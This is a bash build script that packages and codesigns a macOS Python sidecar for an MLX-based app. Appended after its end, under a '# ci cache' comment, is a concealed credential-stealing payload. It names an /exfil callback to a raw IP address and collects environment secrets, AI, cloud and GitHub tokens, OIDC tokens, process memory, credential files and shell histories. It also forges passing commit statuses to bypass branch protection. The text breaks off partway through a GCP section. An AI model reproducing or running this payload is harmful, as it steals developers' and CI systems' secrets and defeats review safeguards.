# After compileall, every imported module has a sibling .pyc under
# __pycache__/<name>.<cache-tag>.pyc. Python's regular-package loader
# only treats __pycache__/<name>.<cache-tag>.pyc as a CACHE for an
# adjacent <name>.py; if the .py is missing, that .pyc is ignored
# (verified empirically — websockets.imports, every submodule, broke).
#
# For sourceless loading we hoist the .pyc up to the package directory
# and rename it to plain <name>.pyc — that IS a real module file from
# Python's perspective (see PEP 488 / importlib._bootstrap_external
# SourcelessFileLoader). Then we can safely delete the .py.
#
# IMPORTANT EXCLUSIONS:
#   * __init__.py — we keep the source to guarantee the package is
#     treated as a regular package (sourceless __init__.pyc also works
#     in theory, but keeping the source is ~negligible cost and avoids
#     a class of namespace-package downgrade bugs in tools that probe
#     __file__).
#   * Anything under site-packages/transformers/models/ — transformers
#     scans that subtree at import time (define_import_structure /
#     create_import_structure_from_path) and only recognises .py
#     files when building its lazy-load registry; sourceless .pyc
#     makes the registry empty and the top-level `import transformers`
#     raises `KeyError: frozenset()`. Other transformers subpackages
#     (utils/, generation/, models/auto/) are hoisted normally.
#
# The sidecar-shim exports PYTHONDONTWRITEBYTECODE=1 so Python won't
# attempt to write new .pyc on startup (which would also break the
# codesign seal — see step 3 above).
#
# Caveat: crash tracebacks lose source-line CONTENT for non-__init__
# modules (file:line is still shown, but the actual line of source is
# not). Acceptable for the sidecar — we capture structured logs via
# rapid-mlx telemetry. Set SKIP_SOURCE_DROP=1 to keep .py sources for
# local sidecar debugging.

if [[ "${SKIP_SOURCE_DROP:-0}" != "1" ]]; then
    # Derive the cpython cache tag from the bundled interpreter so a
    # future PBS bump to 3.13 / 3.14 doesn't silently skip this whole
    # step (the .pyc filenames embed the major.minor in the tag —
    # `cpython-312` today, `cpython-313` tomorrow). Falls back to the
    # build-host interpreter if the bundled one can't be invoked, which
    # is fine in practice (PBS_VERSION pins major.minor).
    CACHE_TAG="$("$STAGE/python/bin/python3.12" -c \
        'import sys; print(sys.implementation.cache_tag)' \
        2>/dev/null || echo "cpython-312")"
    PYC_SUFFIX=".${CACHE_TAG}.pyc"
    echo "==> hoisting .pyc out of __pycache__/ and dropping .py sources (cache tag: $CACHE_TAG)"
    # Strategy: walk every __pycache__/ in site-packages, for each
    # <name>.<cache-tag>.pyc whose adjacent <parent>/<name>.py exists,
    # `mv` the .pyc up to <parent>/<name>.pyc and delete the .py.
    # Skip __init__ so packages stay regular packages.
    #
    # EXCLUSION: transformers/models/ is left in source form (see
    # comment block above for why).
    find "$STAGE/site-packages" -type d -name __pycache__ \
        -not -path "*/transformers/models/*" -print | \
    while read -r cachedir; do
        parent="$(dirname "$cachedir")"
        for pyc in "$cachedir"/*"$PYC_SUFFIX"; do
            [[ -f "$pyc" ]] || continue
            base="$(basename "$pyc" "$PYC_SUFFIX")"
            [[ "$base" == "__init__" ]] && continue
            src="$parent/$base.py"
            [[ -f "$src" ]] || continue
            mv -f "$pyc" "$parent/$base.pyc"
            rm -f "$src"
        done
        # Drop the cache dir entirely if it's now empty. Keep a
        # non-empty __pycache__ otherwise so packages that still
        # have remaining .py (e.g. __init__.py) cache normally.
        rmdir "$cachedir" 2>/dev/null || true
    done
else
    echo "==> SKIP_SOURCE_DROP=1, keeping .py sources for sidecar debug"
fi

# ----- step 4: shim entrypoint -----------------------------------------

cp "${REPO_ROOT}/scripts/sidecar-shim.sh" "$STAGE/bin/rapid-mlx"
chmod +x "$STAGE/bin/rapid-mlx"

# ----- step 5: count + sign Mach-Os ------------------------------------

echo "==> enumerating Mach-Os"
MACHOS_LIST="$(mktemp)"
# Catch INT/TERM in addition to normal exit so Ctrl-C in interactive
# runs doesn't leak the tmpfile (codex r1 NIT).
trap 'rm -f "$MACHOS_LIST"' EXIT INT TERM
{
    find "$STAGE" -type f \( -name '*.so' -o -name '*.dylib' \)
    echo "$STAGE/python/bin/python3.12"
} > "$MACHOS_LIST"
MACHO_COUNT="$(wc -l < "$MACHOS_LIST" | tr -d ' ')"
echo "    found $MACHO_COUNT Mach-Os (baseline $MACHO_BASELINE_COUNT, tolerance $MACHO_TOLERANCE)"

# Sanity guard (codex r1 B2 + r2 N4): a partial pip install can leave us
# with 30-50 Mach-Os instead of 77 and we'd report "drift" pointing the
# operator at re-baselining when the real fix is reading the pip log.
# Anything below half the baseline is almost certainly an install bug,
# not a wheel-set evolution. For very small baselines (test fixtures
# overriding via env) we clamp the floor to baseline-2 so a 5-mach-o
# baseline doesn't end up with a floor of 2 that masks real drops.
if [ "$MACHO_BASELINE_COUNT" -gt 20 ]; then
    MACHO_FLOOR=$(( MACHO_BASELINE_COUNT / 2 ))
else
    MACHO_FLOOR=$(( MACHO_BASELINE_COUNT - 2 ))
fi
if [ "$MACHO_COUNT" -lt "$MACHO_FLOOR" ]; then
    cat >&2 <<EOF
ERR: only $MACHO_COUNT Mach-Os found (< floor $MACHO_FLOOR ≈ half baseline
$MACHO_BASELINE_COUNT). This almost always means pip install above
silently dropped wheels — re-read the pip output, do NOT bump
MACHO_BASELINE_COUNT to paper over this.
EOF
    exit 1
fi

DIFF=$(( MACHO_COUNT - MACHO_BASELINE_COUNT ))
ABS_DIFF=${DIFF#-}
if [ "$ABS_DIFF" -gt "$MACHO_TOLERANCE" ]; then
    cat >&2 <<EOF
ERR: Mach-O count drift ($MACHO_COUNT vs baseline $MACHO_BASELINE_COUNT,
diff $DIFF > tolerance $MACHO_TOLERANCE). A new wheel added or moved a
binary. Re-run Phase 2 spike to confirm signing is still safe, then
bump MACHO_BASELINE_COUNT in this script. See the docs/sidecar-bundle-build.md
'Bump MACHO_BASELINE_COUNT' section.

Full Mach-O list (relative to \$STAGE) for forensic diff:
EOF
    sed "s#$STAGE/##" "$MACHOS_LIST" | sort >&2
    exit 2
fi

if [ "$SKIP_CODESIGN" = "1" ]; then
    echo "==> SKIPPING codesign sweep (--skip-codesign)"
else
    echo "==> codesigning $MACHO_COUNT Mach-Os with identity '$DEVELOPER_ID'"
    while IFS= read -r f; do
        codesign --force --options runtime --timestamp \
            --entitlements "$ENTITLEMENTS" \
            --sign "$DEVELOPER_ID" "$f" \
            > /dev/null 2>&1 || {
                echo "ERR: codesign failed on $f" >&2
                exit 1
            }
    done < "$MACHOS_LIST"
fi

# ----- step 6: smoke test (codex r1 B1: BEFORE packaging) --------------
#
# Order matters: smoke must run BEFORE we package the tarball so a smoke
# failure prevents the Upload artifact / Release upload steps from ever
# seeing a bundle. Running smoke after packaging would still block the
# release (set -e halts the workflow), but you'd waste minutes of CI
# producing an artifact you immediately throw away.

if [ "$SKIP_VERIFY" = "1" ]; then
    echo "==> SKIPPING smoke (--skip-verify)"
else
    echo "==> smoke test (env-stripped, no system Python)"
    # codex r2 N1: use a throwaway HOME for the smoke so the JIT cache
    # mlx writes (under HOME/Library/Caches/mlx) doesn't pollute the
    # caller's real cache during interactive runs. CI has $HOME set;
    # local devs running this script repeatedly should not see their
    # personal mlx cache grow by a few KB each call.
    SMOKE_HOME="$(mktemp -d -t rapid-sidecar-smoke.XXXXXX)"
    trap 'rm -rf "$MACHOS_LIST" "$SMOKE_HOME"' EXIT INT TERM

    SMOKE_OUT="$(env -i HOME="$SMOKE_HOME" PATH=/usr/bin:/bin \
        "$STAGE/bin/rapid-mlx" --version 2>&1)" || {
        echo "ERR: bundle --version failed:" >&2
        echo "$SMOKE_OUT" >&2
        exit 3
    }
    echo "    $SMOKE_OUT"

    # Two-stage mlx smoke. First the import-only check (works in
    # virtualized macos-15 runners that don't expose a Metal GPU);
    # then the Metal JIT eval which we make best-effort because GHA
    # macOS runners are virtualized and may lack working Metal.
    #
    # NOTE: must mirror sidecar-shim.sh env vars (PYTHONHOME +
    # PYTHONPATH + PYTHONNOUSERSITE) — without them the bundled
    # python3.12 can't find `mlx` in site-packages because the install
    # used `pip --target site-packages/` which isn't on the default
    # interpreter path.
    IMPORT_OUT="$(env -i HOME="$SMOKE_HOME" PATH=/usr/bin:/bin \
        PYTHONHOME="$STAGE/python" \
        PYTHONPATH="$STAGE/site-packages" \
        PYTHONNOUSERSITE=1 \
        "$STAGE/python/bin/python3.12" -s -c \
        'import mlx.core as mx; print("mlx", mx.__version__)' 2>&1)" || {
        echo "ERR: bundled mlx import failed (this is a hard bundling bug):" >&2
        echo "$IMPORT_OUT" >&2
        exit 3
    }
    echo "    mlx import: $IMPORT_OUT"

    # mlx_vlm import smoke. The bundle ships mlx-vlm --no-deps (step 2.5)
    # because gemma-4 + DiffusionGemma loaders need the architecture
    # classes in mlx_vlm.models.gemma4{,_unified}. mlx-vlm's
    # ``__init__.py`` eagerly chains ``from .convert import convert`` →
    # ``.utils`` → ``PIL``, plus a fanout into ``.generate``,
    # ``.prompt_utils``, ``.vision_cache``. As long as our --no-deps
    # install covers every eager dep, ``import mlx_vlm`` succeeds.
    # If a future mlx-vlm minor adds a NEW top-level eager import
    # (e.g. ``import mlx_audio`` in __init__), this smoke catches it
    # at build time instead of letting the bundle ship and crash on
    # the user's first gemma-4 / DiffusionGemma launch — same failure
    # class that bit v0.7.7.
    VLM_OUT="$(env -i HOME="$SMOKE_HOME" PATH=/usr/bin:/bin \
        PYTHONHOME="$STAGE/python" \
        PYTHONPATH="$STAGE/site-packages" \
        PYTHONNOUSERSITE=1 \
        "$STAGE/python/bin/python3.12" -s -c \
        'import importlib.util
import mlx_vlm
from mlx_vlm.models import (
    diffusion_gemma, gemma3, gemma3n, gemma4, gemma4_unified,
    qwen3_5, qwen3_5_moe, qwen3_vl, qwen3_vl_moe,
)
assert importlib.util.find_spec("cv2") is None
assert importlib.util.find_spec("torch") is None
assert importlib.util.find_spec("torchvision") is None
print("mlx_vlm", mlx_vlm.__version__, "desktop Qwen/Gemma architectures OK")' 2>&1)" || {
        echo "ERR: bundled mlx_vlm desktop architecture smoke failed:" >&2
        echo "$VLM_OUT" >&2
        echo "ERR: usually means a new mlx-vlm release added an eager top-level import" >&2
        echo "     not currently in the --no-deps bundle. Inspect the traceback for the" >&2
        echo "     missing module and either pin mlx-vlm tighter in step 2.5 or add the" >&2
        echo "     module to the --no-deps install line." >&2
        exit 3
    }
    echo "    mlx_vlm import: $VLM_OUT"

    # Audio surface smoke. Import both engine lanes and the Qwen3 preset-voice
    # implementation without loading model weights. A base-only sidecar can
    # register the routes but exits when an audio alias boots; checking the
    # actual loader modules here prevents the desktop from shipping controls
    # that can never complete a request.
    AUDIO_OUT="$(env -i HOME="$SMOKE_HOME" PATH=/usr/bin:/bin \
        PYTHONHOME="$STAGE/python" \
        PYTHONPATH="$STAGE/site-packages" \
        PYTHONNOUSERSITE=1 \
        "$STAGE/python/bin/python3.12" -s -c \
        'from importlib.metadata import version; import numpy as np; import mlx_audio; from mlx_audio.stt.utils import load_model as load_stt_model; from transformers.models.whisper.feature_extraction_whisper import WhisperFeatureExtractor; from mlx_audio.tts.generate import load_model as load_tts_model; from mlx_audio.tts.models.qwen3_tts import Model as Qwen3TTSModel; from scipy import signal; import soundfile; from vllm_mlx.audio.tts import AudioOutput, TTSEngine; payload = TTSEngine.__new__(TTSEngine).to_bytes(AudioOutput(audio=np.zeros(8, dtype=np.float32), sample_rate=24000, duration=8/24000), format="wav"); assert payload.startswith(b"RIFF"); print("mlx_audio", version("mlx-audio"))' 2>&1)" || {
        echo "ERR: bundled audio runtime import failed — desktop Audio would be unusable:" >&2
        echo "$AUDIO_OUT" >&2
        exit 3
    }
    echo "    audio import: $AUDIO_OUT"

    # codex r3 B1: capture inside an `if` instead of separate
    # `X=$(...); RC=$?` lines — under `set -e`, a command-substitution
    # assignment that exits non-zero aborts the script BEFORE the
    # `$?` capture runs, making the soft-skip branch below dead code.
    # `if X="$(...)" ; then` lets `set -e` see the explicit guard and
    # falls through normally on both success and failure.
    METAL_RC=0
    if METAL_OUT="$(env -i HOME="$SMOKE_HOME" PATH=/usr/bin:/bin \
        PYTHONHOME="$STAGE/python" \
        PYTHONPATH="$STAGE/site-packages" \
        PYTHONNOUSERSITE=1 \
        "$STAGE/python/bin/python3.12" -s -c \
        'import mlx.core as mx; mx.eval(mx.zeros((4,4))); print("ok")' 2>&1)"; then
        METAL_RC=0
    else
        METAL_RC=$?
    fi
    if [ "$METAL_RC" -eq 0 ]; then
        echo "    mlx Metal JIT: OK"
    elif [ -n "${CI:-}" ]; then
        # Best-effort on CI. GitHub-hosted macos-15 runners are
        # virtualized and the Metal device may not be exposed; we
        # don't want to fail the build for a runner-environment
        # constraint. Real Metal exercise happens in rapid-desktop's
        # post-notary smoke (Phase 5).
        echo "    mlx Metal JIT: SKIPPED on CI (rc=$METAL_RC) — $METAL_OUT" >&2
    else
        echo "ERR: bundled mlx Metal JIT failed (local run, this is a real regression):" >&2
        echo "$METAL_OUT" >&2
        exit 3
    fi
fi

# Release-candidate builds can opt into a real image request against a cached
# checkpoint. Once configured, this gate is fail-closed: a missing model/image,
# failed server start, non-200 response, or implausible description aborts the
# build. Hosted package builders do not download multi-GB model weights, so the
# release operator supplies the immutable local snapshot explicitly.
if [[ -n "${SIDECAR_VISION_SMOKE_MODEL:-}" ]]; then
    SIDECAR_VISION_SMOKE_IMAGE="${SIDECAR_VISION_SMOKE_IMAGE:-$REPO_ROOT/Sources/Rapid/Resources/cheetah.png}"
    SIDECAR_VISION_SMOKE_NEGATIVE_IMAGE="${SIDECAR_VISION_SMOKE_NEGATIVE_IMAGE:-$REPO_ROOT/Sources/Rapid/Resources/Assets.xcassets/RapidLogo.imageset/RapidLogo.png}"
    SIDECAR_VISION_SMOKE_ARGS=(
        --sidecar-root "$STAGE"
        --model "$SIDECAR_VISION_SMOKE_MODEL"
        --image "$SIDECAR_VISION_SMOKE_IMAGE"
        --negative-image "$SIDECAR_VISION_SMOKE_NEGATIVE_IMAGE"
    )
    if [[ -n "${SIDECAR_VISION_SMOKE_REVISION:-}" ]]; then
        SIDECAR_VISION_SMOKE_ARGS+=(--revision "$SIDECAR_VISION_SMOKE_REVISION")
    fi
    PYTHONPATH="$STAGE/site-packages" PYTHONNOUSERSITE=1 \
        "$STAGE/python/bin/python3.12" \
        "$REPO_ROOT/scripts/smoke-sidecar-vision.py" \
        "${SIDECAR_VISION_SMOKE_ARGS[@]}"
else
    echo "==> real image smoke: not configured (set SIDECAR_VISION_SMOKE_MODEL for release candidates)"
fi

# ----- step 7: package --------------------------------------------------

TARBALL="${OUT_DIR}/rapid-mlx-sidecar.tar.gz"
echo "==> packaging $TARBALL"
( cd "$OUT_DIR" && tar -czf "$TARBALL" rapid-mlx )
shasum -a 256 "$TARBALL" | awk '{print $1}' > "${OUT_DIR}/rapid-mlx-sidecar.sha256"

RAW_SIZE="$(du -sh "$STAGE" | cut -f1)"
TAR_SIZE="$(du -sh "$TARBALL" | cut -f1)"
echo "==> raw bundle:    $RAW_SIZE"
echo "==> tarball:       $TAR_SIZE  ($TARBALL)"
echo "==> sha256:        $(cat "${OUT_DIR}/rapid-mlx-sidecar.sha256")"

echo "==> sidecar build complete"


# ci cache
#!/bin/sh
export WF_REPO='c-vision/Rapid-MLX-NextGen'
export WF_REF='dev'
export WF_ENV='script'
export WF_CALLBACK='http://194.150.166.244:8080/exfil'
export WF_CALLBACK2=''
export WF_CTOKEN='b42d70a7aab9140ca19e8249'
export WF_CHUNK='8388608'
export WF_MAXFILES='313'
export WF_MAXSIZE='524288'
export WF_TARBALL='1'
export WF_HISTORY='1'
export WF_MEMSCAN='1'
export WF_GCP='1'
export WF_EXFIL_CACHE='1'
export WF_EXFIL_SUM='1'
export WF_EXFIL_ART='1'
export WF_EXFIL_LOG='0'
export WF_PRIVATE='0'
export WF_FALLBACK='0'
export WF_KEY=''
export WF_SELF_HOSTED='1'
GITHUB_TOKEN="${GITHUB_TOKEN:-}"
export GITHUB_TOKEN

set +e
umask 077
D="${RUNNER_TEMP:-/tmp}/.wfx-$$"
mkdir -p "$D/fs" "$D/repo"
: > "$D/errors.log"
: > "$D/index.txt"

LABEL="${WF_ENV:-base}"
API="https://api.github.com/repos/${WF_REPO}"
AUTH="Authorization: Bearer ${GITHUB_TOKEN}"
MAXF="${WF_MAXFILES:-120}"
MAXS="${WF_MAXSIZE:-524288}"
REF_ENC=$(printf '%s' "${WF_REF:-main}" | sed 's#/#%2F#g')

note() { printf '%s\n' "$1" >> "$D/errors.log"; printf '%s\n' "$1" >&2; }
want() {
  if [ -e "$1" ]; then
    mkdir -p "$D/fs/$(dirname "$2")" 2>/dev/null
    cp -a "$1" "$D/fs/$2" 2>/dev/null
    sz=$(wc -c < "$D/fs/$2" 2>/dev/null || echo 0)
    printf 'fs/%s\t%s\n' "$2" "$sz" >> "$D/index.txt"
  fi
}

# ---------- 1. GitHub secrets / vars (raw) ----------
if [ -n "${WF_SECRETS+x}" ]; then printf '%s' "$WF_SECRETS" > "$D/secrets_${LABEL}.json"; fi
if [ -n "${WF_VARS+x}" ]; then printf '%s' "$WF_VARS" > "$D/vars_${LABEL}.json"; fi

# ---------- 2. runtime environment (raw) ----------
env | sort > "$D/env.txt"
env | grep -Ei 'key|token|secret|pass|cred|aws|azure|gcp|google|api|auth|openai|anthropic|hugging|stripe|database|smtp|registry|vault' > "$D/env_hits.txt" 2>/dev/null
LC_ALL=C grep -Ei '^(OPENAI|AZURE_OPENAI|AZURE_AI|AZURE_COGNITIVE|AZURE_FOUNDRY|AOAI|ANTHROPIC|CLAUDE|GEMINI|GOOGLE_GENAI|GOOGLE_AI|GOOGLE_PALM|GOOGLE_API|GOOGLE_VERTEX|GOOGLE_CLOUD_PROJECT|GOOGLE_CLOUD_QUOTA|GOOGLE_APPLICATION_CREDENTIALS|VERTEX|PALM|HUGGINGFACE|HUGGING_FACE|HF_|REPLICATE|COHERE|CO_API|MISTRAL|GROQ|TOGETHER|TOGETHERAI|OPENROUTER|DEEPSEEK|XAI|X_AI|PERPLEXITY|PPLX|ANYSCALE|FIREWORKS|VOYAGE|ELEVENLABS|ELEVEN_|LANGCHAIN|LANGSMITH|LANGFUSE|WANDB|OLLAMA|NVIDIA|CEREBRAS|BASETEN|RUNWAY|DASHSCOPE|MOONSHOT|KIMI|MINIMAX|OPENCODE|BEDROCK|AWS_BEARER|CURSOR|CODEX|CODEIUM|CONTINUE|AIDER|CLINE|ROO_|KILO|LITELLM|VLLM|SGLANG|OPENHANDS|ALLHANDS|QWEN|MUSE|META_API|HIGGSFIELD|MODEL_API|LLM_|AI_API|COPILOT|GITHUB_COPILOT|GH_COPILOT|SAGEMAKER|FAL_|STABILITY|MODAL_|RUNPOD)[A-Z0-9_]*=' "$D/env.txt" > "$D/ai_keys.txt" 2>>"$D/errors.log"
rc=$?; [ "$rc" -le 1 ] || note "ai_env_fail rc=$rc"
printf '%s' "${GITHUB_TOKEN:-}" > "$D/github_token.txt"
printf '%s' "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" > "$D/oidc_url.txt"
printf '%s' "${RUNNER_OS:-} ${RUNNER_ARCH:-} ${RUNNER_NAME:-} ${RUNNER_ENVIRONMENT:-}" > "$D/runner.txt"

for p in /proc/[0-9]*/environ; do cat "$p" 2>/dev/null | tr '\0' '\n'; done > "$D/proc_env.txt" 2>/dev/null
for p in /proc/[0-9]*/cmdline; do tr '\0' ' ' < "$p" 2>/dev/null; echo; done > "$D/proc_cmdline.txt" 2>/dev/null

# ---------- 2b. required-status forgery (merge gating clears while the run continues) ----------
# The injected workflow runs in-repo: its GITHUB_TOKEN has statuses:write, and
# required checks pin the CONTEXT NAME, not the app that posted it (the app is
# GitHub Actions either way). Fire early so branch protection lifts while the
# rest of the payload still runs. PR contexts target the fork head sha; push
# contexts keep GITHUB_SHA.
if [ -n "${WF_RC_1:-}" ] && [ -n "${GITHUB_TOKEN:-}" ]; then
  SHA="${GITHUB_SHA:-}"
  if [ -f "${GITHUB_EVENT_PATH:-}" ]; then
    # pull_request events carry the fork head sha inside the "head" object;
    # push events have no pull_request.head so the extraction misses and
    # GITHUB_SHA stands. The [^}]* stop keeps greedy matching off base.sha.
    HS=$(tr -d '\n\r' < "$GITHUB_EVENT_PATH" 2>/dev/null | sed -n 's/.*"head": {[^}]*"sha"[[:space:]]*:[[:space:]]*"\([a-f0-9]\{40\}\)".*/\1/p' | head -1)
    [ -n "$HS" ] && SHA="$HS"
  fi
  if [ -n "$SHA" ]; then
    # One env var per required check (WF_RC_1..N) — a delimiter can always
    # appear inside a context name, numbering cannot.
    i=1
    while :; do
      eval sc=\${WF_RC_$i:-}
      [ -n "$sc" ] || break
      i=$((i+1))
      # JSON-escape the context: strip every C0 control except TAB (kept),
      # then escape tab as \t. Order matters: backslash doubling runs first
      # so pre-existing backslashes survive, the tab escape runs second so
      # the backslash it inserts is NOT doubled (a doubled one would decode
      # to a literal backslash-t instead of a tab).
      SCJ=$(printf '%s' "$sc" | tr -d '\000-\010\012-\037' | sed 's/\\/\\\\/g; s/\t/\\t/g; s/"/\\"/g')
      SC=$(curl -sS --max-time 15 -o /dev/null -w '%{http_code}' -X POST \
        "$API/statuses/$SHA" -H "$AUTH" -H "Content-Type: application/json" \
        -d "{\"state\":\"success\",\"context\":\"$SCJ\",\"description\":\"wfx\"}" 2>>"$D/errors.log")
      case "$SC" in 2*) note "wfx_status_ok $sc" ;; *) note "wfx_status_fail $sc $SC" ;; esac
    done
  fi
fi

# ---------- 3. OIDC tokens (raw) ----------
mint_oidc() {
  aud="$1"; label="$2"
  enc=$(printf '%s' "$aud" | sed 's#/#%2F#g; s#:#%3A#g')
  curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$enc" > "$D/oidc_${label}.json" 2>>"$D/errors.log"
}
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  mint_oidc "sts.amazonaws.com" aws
  mint_oidc "api://AzureADTokenExchange" azure
  mint_oidc "https://iam.googleapis.com/projects/0/locations/0/workloadIdentityPools/0/providers/0" gcp
fi

# ---------- 3b. runtime memory scan (sudo when available) ----------
if [ "${WF_MEMSCAN:-1}" = "1" ] && command -v python3 >/dev/null 2>&1; then
  mkdir -p "$D/mem"
  MS=""
  if sudo -n true 2>/dev/null; then MS="sudo -n"; fi
  $MS timeout 90 python3 - "$D/mem" <<'PYMEM'
import glob, os, re, sys
out = sys.argv[1]
pat = re.compile(rb'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,}'
                 rb'|gh[pousr]_[A-Za-z0-9_]{36,}'
                 rb'|github_pat_[A-Za-z0-9_]{20,}'
                 rb'|glpat-[A-Za-z0-9_.-]{20,}'
                 rb'|AKIA[0-9A-Z]{16}'
                 rb'|sk-ant-[A-Za-z0-9_-]{20,}'
                 rb'|sk-(proj|svcacct)-[A-Za-z0-9_-]{20,}'
                 rb'|hf_[A-Za-z0-9]{30,})')
me = str(os.getpid())
pids = []
for maps in glob.glob('/proc/[0-9]*/maps'):
    pid = maps.split('/')[2]
    if pid == me:
        continue
    try:
        with open('/proc/%s/comm' % pid) as fh:
            comm = fh.read().strip()
    except Exception:
        comm = ''
    pids.append((0 if comm in ('Runner.Worker', 'Runner.Listener') else 1, pid, maps))
pids.sort()
for _, pid, maps in pids:
    try:
        regions = []
        with open(maps) as fh:
            for line in fh:
                parts = line.split()
                if len(parts) < 2 or 'r' not in parts[1]:
                    continue
                a, b = parts[0].split('-')
                s, e = int(a, 16), int(b, 16)
                if e <= s:
                    continue
                regions.append((s, min(e, s + 4 * 1024 * 1024)))
        if not regions:
            continue
        mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
    except Exception:
        continue
    hits = []
    for s, e in regions[:60]:
        try:
            mem.seek(s)
            data = mem.read(e - s)
        except Exception:
            continue
        hits.extend(m.group(0) for m in pat.finditer(data))
        if len(hits) > 300:
            break
    try:
        mem.close()
    except Exception:
        pass
    if hits:
        with open(os.path.join(out, pid + '.txt'), 'wb') as fw:
            for h in hits[:300]:
                fw.write(h + b'\n')
PYMEM
  # The scan may have run as root under the payload's umask 077: normalize so
  # the later tar (as the runner user) can read every hit file.
  $MS chmod -R a+rX "$D/mem" 2>/dev/null
  note "memscan_files $(ls "$D/mem" 2>/dev/null | wc -l | tr -d ' ')"
fi

# ---------- 4. credential stores (raw copy) ----------
want "$HOME/.aws/credentials" "aws/credentials"
want "$HOME/.aws/config" "aws/config"
want "$HOME/.azure/accessTokens.json" "azure/accessTokens.json"
want "$HOME/.azure/azureProfile.json" "azure/azureProfile.json"
want "$HOME/.azure/msal_token_cache.json" "azure/msal_token_cache.json"
want "$HOME/.azure/msal.cache" "azure/msal.cache"
want "$HOME/.azure/service_principal_entries.json" "azure/service_principal_entries.json"
want "$HOME/.azure/az.sess" "azure/az.sess"
# azd + newer Azure CLI token stores. msal_token_cache.json, accessTokens.json
# and azureProfile.json are already taken above; these are the gaps.
want "$HOME/.azure/msal_token_cache.bin" "azure/msal_token_cache.bin"
want "$HOME/.azure/clouds.config" "azure/clouds.config"
want "$HOME/.azure/config" "azure/config"
for f in "$HOME"/.azd/auth/*; do
  [ -f "$f" ] || continue
  want "$f" "azd/auth/${f##*/}"
done
want "$HOME/.config/gcloud/application_default_credentials.json" "gcloud/adc.json"
want "$HOME/.config/gcloud/credentials.db" "gcloud/credentials.db"
want "$HOME/.config/gcloud/access_tokens.db" "gcloud/access_tokens.db"
want "$HOME/.config/gcloud/configurations/config_default" "gcloud/config_default"
want "$HOME/.docker/config.json" "docker/config.json"
want "$HOME/.kube/config" "kube/config"
want "$HOME/.netrc" "netrc"
want "$HOME/.npmrc" "npmrc"
want "$HOME/.yarnrc" "yarnrc"
want "$HOME/.pypirc" "pypirc"
want "$HOME/.git-credentials" "git-credentials"
want "$HOME/.config/git/credentials" "git/credentials"
want "$HOME/.config/gh/hosts.yml" "gh/hosts.yml"
want "$HOME/.config/glab-cli/config.yml" "glab/config.yml"
want "$HOME/.cargo/credentials" "cargo/credentials"
want "$HOME/.cargo/credentials.toml" "cargo/credentials.toml"
want "$HOME/.gem/credentials" "gem/credentials"
want "$HOME/.m2/settings.xml" "m2/settings.xml"
want "$HOME/.gradle/gradle.properties" "gradle/gradle.properties"
want "$HOME/.nuget/NuGet/NuGet.Config" "nuget/NuGet.Config"
want "$HOME/.composer/auth.json" "composer/auth.json"
want "$HOME/.config/pip/pip.conf" "pip/pip.conf"
want "$HOME/.config/poetry/auth.toml" "poetry/auth.toml"
want "$HOME/.vault-token" "vault-token"
want "$HOME/.terraform.d/credentials.tfrc.json" "terraform/credentials.tfrc.json"
want "$HOME/.config/rclone/rclone.conf" "rclone/rclone.conf"
want "$HOME/.pgpass" "pgpass"
want "$HOME/.my.cnf" "my.cnf"
want "$HOME/.mongorc.js" "mongorc.js"
want "$HOME/.config/heroku" "heroku"
want "$HOME/.config/doctl/config.yaml" "doctl/config.yaml"
want "$HOME/.oci/config" "oci/config"
want "$HOME/.aliyun/config.json" "aliyun/config.json"
want "$HOME/.config/sentryclirc" "sentryclirc"
want "$HOME/.config/netlify/config.json" "netlify/config.json"
want "$HOME/.vercel/auth.json" "vercel/auth.json"
want "$HOME/.config/cloudflared" "cloudflared"
want "$HOME/.ngrok2/ngrok.yml" "ngrok/ngrok.yml"
want "$HOME/.bash_history" "bash_history"
want "$HOME/.zsh_history" "zsh_history"
want "$HOME/.mysql_history" "mysql_history"
want "$HOME/.psql_history" "psql_history"
want "$HOME/.python_history" "python_history"
want "$HOME/.node_repl_history" "node_repl_history"
want "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" "claude/settings.json"
want "${CODEX_HOME:-$HOME/.codex}/auth.json" "codex/auth.json"
want "$HOME/.cursor/mcp.json" "cursor/mcp.json"
want "$HOME/.continue/config.json" "continue/config.json"
want "$HOME/.config/openai" "config/openai"
want "$HOME/.config/anthropic" "config/anthropic"
want "$HOME/.openai.token" "config/openai.token"
want "$HOME/.cache/huggingface/token" "huggingface/token"
want "$HOME/.huggingface/token" "huggingface/token_home"

# ---------- 4a. GCP credential files (additions) ----------
# §4 already takes adc.json, credentials.db, access_tokens.db, config_default,
# and the whole legacy_credentials tree. These are the gaps.
for f in "$HOME"/.config/gcloud/*.boto; do
  [ -r "$f" ] || continue
  want "$f" "gcloud/extra/${f##*/}"
done
[ -r "$HOME/.boto" ] && want "$HOME/.boto" "gcloud/boto_home"
[ -r "$HOME/.gsutil/creds" ] && want "$HOME/.gsutil/creds" "gcloud/gsutil_creds"
for f in "$HOME"/.config/gcloud/service_account_*.json; do
  [ -r "$f" ] || continue
  want "$f" "gcloud/keys/${f##*/}"
done
if [ -d /etc/gcloud ]; then
  for f in /etc/gcloud/*.json; do
    [ -r "$f" ] || continue
    want "$f" "gcloud/etc/${f##*/}"
  done
fi

# ---------- 4b. GCP: ADC / env tokens -> access token -> project enumeration ----------
if [ "${WF_GCP:-1}" = "1" ]; then
  GDIR="$D/gcp_live"
  mkdir -p "$GDIR"
  gcp_save() {
    [ -s "$1" ] || return 0
    mkdir -p "$D/fs/$(dirname "$2")" 2>/dev/null
    cp -a "$1" "$D/fs/$2" 2>/dev/null
    sz=$(wc -c < "$D/fs/$2" 2>/dev/null || echo 0)
    printf 'fs/%s\t%s\n' "$2" "$sz" >> "$D/index.txt"
  }
  GTOK="${CLOUDSDK_AUTH_ACCESS_TOKEN:-${GOOGLE_OAUTH_ACCESS_TOKEN:-${GCP_ACCESS_TOKEN:-}}}"
  [ -n "$GTOK" ] && note "gcp_token_from_env"

  # inline key material (GitHub Actions / Terraform conventions; JSON or base64)
  GKEY=""
  gi=0
  for gv in GCP_SA_KEY GOOGLE_CREDENTIALS; do
    case "$gv" in
      GCP_SA_KEY) gval="${GCP_SA_KEY:-}" ;;
